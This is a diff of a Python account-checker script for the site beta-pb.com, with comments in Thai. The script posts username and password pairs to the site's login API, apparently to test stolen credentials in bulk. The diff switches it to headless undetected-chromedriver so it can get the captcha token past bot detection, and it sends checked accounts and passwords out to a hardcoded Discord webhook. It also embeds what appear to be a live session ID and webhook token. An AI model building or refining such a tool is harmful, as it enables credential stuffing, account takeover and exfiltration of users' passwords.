@@ -1,43 +1,65 @@
 import requests
 import time
+import json
+import undetected_chromedriver as uc
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
 import re
-from bs4 import BeautifulSoup
 
 # ================== 🔥 ตั้งค่า ==================
-SESSION_ID = "d9c5d8c81b3012339001b6ffea85abcdaeeb10806a7891568086c70cb854084"  # อันเดิม
+SESSION_ID = "d9c5d8c81b3012339001b6ffea85abcdaeeb10806a7891568086c70cb854084"
 WEBHOOK_URL = "https://discord.com/api/webhooks/1525105752497324072/TU7mNMV_qhmXwuwcooDrJPH8i50YOM4qCny55kI4dko9u-ZN65I6-QQsuJ0n8NtrEGSy"  # 👈 เปลี่ยนเป็นของคุณ
 
 def get_captcha_token():
-    """ดึง captcha_token จากหน้าเว็บโดยตรง (ไม่ต้องใช้ Selenium)"""
-    url = "https://beta-pb.com/"
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-    }
-    resp = requests.get(url, headers=headers)
-    if resp.status_code != 200:
-        print("   ⚠️ ไม่สามารถโหลดหน้าเว็บได้")
-        return ""
+    """ใช้ undetected-chromedriver ดึง captcha_token"""
+    options = uc.ChromeOptions()
+    options.add_argument("--headless")
+    options.add_argument("--no-sandbox")
+    options.add_argument("--disable-dev-shm-usage")
+    options.add_argument("--disable-gpu")
+    options.add_argument("--window-size=1920,1080")
     
-    html = resp.text
-    
-    # วิธีที่ 1: หาใน <input name="captcha_token">
-    soup = BeautifulSoup(html, 'html.parser')
-    inp = soup.find('input', {'name': 'captcha_token'})
-    if inp and inp.get('value'):
-        return inp['value']
-    
-    # วิธีที่ 2: หาใน <script> ด้วย regex
-    match = re.search(r'captcha_token\s*[:=]\s*["\']([^"\']+)["\']', html)
-    if match:
-        return match.group(1)
-    
-    # วิธีที่ 3: หาใน data attribute
-    match = re.search(r'data-captcha-token=["\']([^"\']+)["\']', html)
-    if match:
-        return match.group(1)
-    
-    print("   ⚠️ ไม่พบ captcha_token ในหน้าเว็บ")
-    return ""
+    driver = None
+    try:
+        driver = uc.Chrome(options=options, version_main=None)
+        driver.get("https://beta-pb.com")
+        
+        # รอให้ JavaScript โหลด
+        wait = WebDriverWait(driver, 15)
+        
+        token = None
+        
+        # หา token ใน input
+        try:
+            elem = wait.until(EC.presence_of_element_located((By.NAME, "captcha_token")))
+            token = elem.get_attribute("value")
+        except:
+            pass
+        
+        # หา token ใน JavaScript
+        if not token:
+            try:
+                token = driver.execute_script("return window.captcha_token || ''")
+            except:
+                pass
+        
+        # หา token ใน data attribute
+        if not token:
+            try:
+                elem = driver.find_element(By.CSS_SELECTOR, "[data-captcha-token]")
+                token = elem.get_attribute("data-captcha-token")
+            except:
+                pass
+        
+        return token
+        
+    except Exception as e:
+        print(f"   ⚠️ Error: {e}")
+        return None
+    finally:
+        if driver:
+            driver.quit()
 
 def check_account(username, password, session, captcha_token):
     headers = {
@@ -53,7 +75,7 @@ def check_account(username, password, session, captcha_token):
         "username": username,
         "password": password,
         "remember_me": False,
-        "captcha_token": captcha_token,
+        "captcha_token": captcha_token or "",
         "language": "th"
     }
     return session.post("https://beta-pb.com/api/session/login", json=payload, headers=headers)
@@ -99,8 +121,8 @@ def send_embed(username, password, profile):
 def main():
     print("🚀 เริ่มตรวจสอบบัญชี...")
     
-    # ===== ดึง captcha_token อัตโนมัติ =====
-    print("🔍 กำลังดึง captcha_token จากหน้าเว็บ...")
+    # ดึง captcha_token
+    print("🔍 กำลังดึง captcha_token...")
     captcha_token = get_captcha_token()
     if not captcha_token:
         print("❌ ไม่สามารถดึง captcha_token ได้")
